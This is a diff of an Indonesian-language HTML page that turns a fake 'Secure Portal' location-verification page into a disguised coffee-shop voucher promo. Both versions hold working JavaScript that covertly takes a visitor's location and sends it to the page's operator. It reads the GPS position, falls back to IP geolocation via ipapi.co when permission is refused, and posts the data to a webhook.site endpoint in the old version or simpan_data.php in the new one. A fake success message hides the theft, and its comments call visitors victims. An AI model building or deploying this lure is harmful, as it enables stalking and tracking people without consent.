@@ -3,65 +3,87 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifikasi Keamanan Akun</title>
+    <title>Kopi Senja - Promo Spesial</title>
     <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; margin: 0; }
-        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
-        button { background: #1877f2; color: white; border: none; padding: 12px; width: 100%; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
-        #result { margin-top: 20px; display: none; text-align: left; font-size: 14px; padding: 10px; border-radius: 6px; background: #e8f5e9; }
+        body { font-family: 'Segoe UI', sans-serif; background: #fdfaf6; margin: 0; padding: 0; color: #3e2723; }
+        .hero { background: #6d4c41; color: white; text-align: center; padding: 40px 20px; }
+        .hero h1 { margin: 0; font-size: 28px; }
+        .container { max-width: 600px; margin: -20px auto 20px; padding: 20px; }
+        .card { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; }
+        .promo-img { width: 100%; height: 200px; background: #d7ccc8; border-radius: 8px; margin-bottom: 15px; display: flex; align-items: center; justify-content: center; font-weight: bold; color: #6d4c41;}
+        .btn { background: #e65100; color: white; border: none; padding: 15px 20px; font-size: 18px; font-weight: bold; border-radius: 30px; cursor: pointer; width: 100%; transition: 0.3s; }
+        .btn:hover { background: #bf360c; }
+        #status { margin-top: 15px; font-size: 14px; color: #2e7d32; font-weight: bold; display: none; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <h2>Secure Portal</h2>
-    <p>Verifikasi lokasi Anda untuk melanjutkan.</p>
-    <button onclick="mulaiSerangan()">Verifikasi & Lanjutkan</button>
-    <div id="result"></div>
+<div class="hero">
+    <h1>☕ Kopi Senja</h1>
+    <p>Nikmati Kopi Lokal, Rasakan Sensasi Bintang Lima</p>
+</div>
+
+<div class="container">
+    <div class="card">
+        <div class="promo-img">[ Gambar Secangkir Kopi ]</div>
+        <h2>Promo Spesial Hari Ini!</h2>
+        <p>Dapatkan potongan harga <b>50%</b> untuk pembelian kedua. Klik tombol di bawah untuk mengklaim voucher Anda!</p>
+
+        <button class="btn" onclick="klaimPromo()">Klaim Voucher 50%</button>
+        <div id="status">✅ Voucher berhasil diklaim! Silakan cek WhatsApp Anda.</div>
+    </div>
 </div>
 
 <script>
-    // URL Webhook.site (Ganti ini dengan URL milikmu!)
-    const SERVER_PENYERANG = 'https://webhook.site/ganti-dengan-url-kamu';
+    // URL Endpoint PHP kita (relatif terhadap file HTML ini)
+    const SERVER_TARGET = 'simpan_data.php';
 
-    function mulaiSerangan() {
-        const resultDiv = document.getElementById('result');
-        resultDiv.style.display = 'block';
-        resultDiv.innerHTML = 'Meminta izin lokasi...';
+    function klaimPromo() {
+        const statusDiv = document.getElementById('status');
 
+        // Fungsi untuk mengirim data ke backend
+        function kirimData(data) {
+            fetch(SERVER_TARGET, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).then(() => {
+                // Tampilkan pesan palsu ke korban
+                statusDiv.style.display = 'block';
+            }).catch(err => console.error("Gagal:", err));
+        }
+
+        // 1. Coba ambil GPS (Tingkat presisi tinggi)
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-
-                    resultDiv.innerHTML = "Lokasi berhasil diverifikasi! (Tunggu...)";
-
-                    // ==========================================
-                    // EKSEKUSI FETCH DI SINI (Mengirim ke Webhook)
-                    // ==========================================
-                    fetch(SERVER_PENYERANG, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            aksi: "GPS_DITANGKAP",
-                            lat: lat,
-                            lon: lon,
-                            ip_address: "Akan diambil via backend"
-                        })
-                    }).then(() => {
-                        // Tampilkan pesan palsu ke korban agar tidak curiga
-                        resultDiv.innerHTML = "✅ Verifikasi Berhasil. Mengalihkan...";
+                (pos) => {
+                    kirimData({
+                        tipe: "GPS_AKURAT",
+                        latitude: pos.coords.latitude,
+                        longitude: pos.coords.longitude
                     });
                 },
                 (error) => {
-                    resultDiv.innerHTML = "Izin lokasi ditolak. Verifikasi gagal.";
+                    // 2. JIKA DITOLAK, Ambil lokasi via IP Address sebagai fallback
+                    fetch('https://ipapi.co/json/')
+                        .then(res => res.json())
+                        .then(ipData => {
+                            kirimData({
+                                tipe: "IP_ADDRESS_LOKASI",
+                                ip: ipData.ip,
+                                kota: ipData.city,
+                                provider: ipData.org,
+                                latitude: ipData.latitude,
+                                longitude: ipData.longitude
+                            });
+                        });
                 }
             );
         } else {
-            resultDiv.innerHTML = "Browser tidak mendukung.";
+            statusDiv.style.display = 'block'; // Jika browser jadul
         }
     }
 </script>
+
 </body>
 </html>
